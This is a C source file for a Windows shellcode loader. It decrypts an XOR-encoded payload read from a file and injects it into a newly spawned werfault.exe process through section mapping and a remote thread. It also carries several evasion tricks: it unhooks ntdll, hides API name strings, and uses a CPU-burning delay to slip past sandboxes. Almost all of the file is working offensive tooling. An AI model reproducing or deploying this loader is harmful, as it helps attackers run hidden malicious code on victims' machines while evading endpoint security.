#include "ntdll.h"
#include <stdio.h>


#define LARGE_NUMBER 500000
#define STATUS_SUCCESS 0
#define INJECTED_PROCESS_NAME L"\\??\\C:\\Windows\\System32\\werfault.exe"

typedef HMODULE(WINAPI* LoadLibraryW_t)(LPCWSTR lpLibFileName);

void sleep()
{
	for (int i = 0; i <= LARGE_NUMBER; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}

char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}



int main(int argc, char** argv)
{


	if (argc != 2) {
		printf("Usage %s <shellcode file>\n", argv[0]);
		return 1;
	}

	sleep();

	UINT64 LoadLibraryAFunc, kernel32dll;
	wchar_t ntdll_c[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0 };
	kernel32dll = GetKernel32();
	CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
	LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
	HMODULE ntdll = (HMODULE)((LoadLibraryW_t)LoadLibraryAFunc)(ntdll_c);

	if (ntdll == NULL)
	{
		exit(1);
	}

	unhookNtdll((HMODULE)ntdll);
	loadNtdll((HMODULE)ntdll);

    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;
    // Reading our encrypted shellcode
    file = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return 1;
    }
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    unsigned char* shellcode = (unsigned char*)fileData;
        
    printf("[+] Read the shellcode size is %d\n", fileSize);
    
    SIZE_T shellcodeSize = fileSize;
    
    HANDLE hSection = NULL;
    NTSTATUS status = NULL;
    SIZE_T size = fileSize;
    LARGE_INTEGER sectionSize = { size };
    PVOID pLocalView = NULL, pRemoteView = NULL;
    int viewUnMap = 2;

    HANDLE currentProcess = GetCurrentProcess();
    UNICODE_STRING imagePathName = {};
    PRTL_USER_PROCESS_PARAMETERS targetProcessParameters = NULL;
    PRTL_USER_PROCESS_INFORMATION targetProcessInformation = NULL;

    XOR((char*)shellcode, shellcodeSize, key, sizeof(key));

    if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS) {
        printf("[-] Cannot create section. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Section: %p\n", hSection);

    if ((status = NtMapViewOfSection(hSection, currentProcess,
        &pLocalView, NULL, NULL, NULL,
        (PULONG)&size, (SECTION_INHERIT)viewUnMap, NULL, PAGE_READWRITE)) != STATUS_SUCCESS) {
        printf("[-] Cannot create Local view. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Local view: %p\n", pLocalView);

    printf("[+] Copying shellcode into the view\n");

    VxMoveMemory(pLocalView, shellcode, shellcodeSize);

    RtlInitUnicodeString(&imagePathName, INJECTED_PROCESS_NAME);
    RtlCreateProcessParameters(&targetProcessParameters, &imagePathName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    targetProcessInformation = (PRTL_USER_PROCESS_INFORMATION)malloc(sizeof(PRTL_USER_PROCESS_INFORMATION));
    RtlCreateUserProcess(&imagePathName, NULL, targetProcessParameters, NULL, NULL, currentProcess, FALSE, NULL, NULL, targetProcessInformation);

    if ((status = NtMapViewOfSection(hSection, targetProcessInformation->ProcessHandle, &pRemoteView, NULL, NULL, NULL,
        (PULONG)&size, (SECTION_INHERIT)viewUnMap, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
        printf("[-] Cannot create remote view. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Remote view: %p\n", pRemoteView);

    printf("[+] Sleeping for 4.27 seconds...\n");
    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }
    
    HANDLE hThread = NULL;
    if ((status = ZwCreateThreadEx(&hThread, 0x1FFFFF, NULL, targetProcessInformation->ProcessHandle, pRemoteView, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS) {
        printf("[-] Cannot create thread. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Thread: %p\n", hThread);

    printf("[+] Sleeping again for 4.27 seconds...\n");
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }

    printf("[+] Executing thread.\n");
    NtResumeThread(hThread, 0);

	FreeLibrary(ntdll);
	return 0;
}

